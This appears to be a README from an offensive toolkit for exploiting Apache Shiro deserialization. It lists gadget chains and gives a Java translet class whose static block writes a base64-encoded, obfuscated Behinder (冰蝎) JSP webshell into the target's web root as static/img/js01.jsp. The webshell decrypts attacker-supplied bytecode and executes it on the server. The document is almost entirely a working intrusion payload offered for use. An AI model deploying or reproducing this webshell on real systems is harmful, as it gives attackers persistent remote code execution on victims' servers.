# Shiro_Xray 

## Gadget
    CommonsBeanutils1
    CommonsCollectionsK1
    CommonsCollectionsK2

![](./xray.png)

## Getshell 冰蝎

```
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.io.PrintWriter;
import java.net.URLDecoder;
import sun.misc.BASE64Decoder;

public class 10837093162496 extends AbstractTranslet {
   static {
      Object var1 = null;
      String var2 = Thread.currentThread().getContextClassLoader().getResource("").getPath();
      var2 = var2.substring(0, var2.indexOf("WEB-INF"));
      var2 = URLDecoder.decode(var2, "utf-8");
      PrintWriter var3 = new PrintWriter(var2 + "static/img/js01.jsp");
      BASE64Decoder var4 = new BASE64Decoder();
      String var5 = new String(var4.decodeBuffer("PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmKHJlcXVlc3QuXHV1dXV1MDA2N1x1dXV1dXV1dXUwMDY1XHV1dXV1MDA3NFx1dXV1dXUwMDUwXHV1dXV1dXUwMDYxXHV1dXV1dTAwNzJcdXV1dXUwMDYxXHV1MDA2ZFx1dXV1dXV1dXUwMDY1XHV1dXV1dXV1dXUwMDc0XHV1dXV1dXV1dTAwNjVcdXV1MDA3MigicmFuZG9tMzQiKSE9bnVsbCl7U3RyaW5nIGs9KCIiK1VVSUQucmFuZG9tVVVJRCgpKS5yZXBsYWNlKCItIiwiIikuc3Vic3RyaW5nKDE2KTtzZXNzaW9uLnB1dFZhbHVlKCJ1IixrKTtvdXQucHJpbnQoIkBAQCIraysiQEBAIik7cmV0dXJuO31DaXBoZXIgYz1DaXBoZXIuZ2V0SW5zdGFuY2UoIkFFUyIpO2MuaW5pdCgyLG5ldyBTZWNyZXRLZXlTcGVjKChzZXNzaW9uLmdldFZhbHVlKCJ1IikrIiIpLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTslPgo="));
      var3.println(var5);
      var3.close();
   }
}
```
